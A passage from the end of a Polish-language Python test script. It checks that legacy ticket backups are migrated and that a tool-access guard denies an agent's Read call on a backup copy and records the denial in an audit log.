    print("  (pominieto test dowiazania: brak uprawnien do utworzenia)")

ALL1 = WORK / "zgloszenia/MIG-3/backup"
ALL1.mkdir(parents=True, exist_ok=True)
(ALL1 / f"{WF3}-20261101T120000Z.json").write_text("{}", encoding="utf-8")
with contextlib.redirect_stdout(io.StringIO()):
    P.migrate_all_legacy_backups()
expect("migracja: wszystkie zgloszenia, nie tylko biezace", (C.backup_dir("MIG-3") / f"{WF3}-20261101T120000Z.json").is_file(), True)

audit_before = (TMP / "state/audyt.jsonl").read_text(encoding="utf-8").count('"narzedzie": "Read"')
guard_in(S31, "Read", {"file_path": str(KOPIA)}, OTHER)
expect("dziennik: odmowa Read zapisana",
       (TMP / "state/audyt.jsonl").read_text(encoding="utf-8").count('"narzedzie": "Read"'), audit_before + 1)
last_fd = json.loads((WORK / "zgloszenia/FD-1/wykonanie.jsonl").read_text(encoding="utf-8").splitlines()[-1])
expect("dziennik wykonania: odnosnik kopii do planu",
       str(last_fd.get("kopia_plan", "")).startswith("backup/") and Path(last_fd["kopia"]).name == last_fd["kopia_plan"][7:],
       True)

print()
print("WSZYSTKO OK" if not FAILS else f"NIEUDANE: {FAILS}")
sys.exit(1 if FAILS else 0)
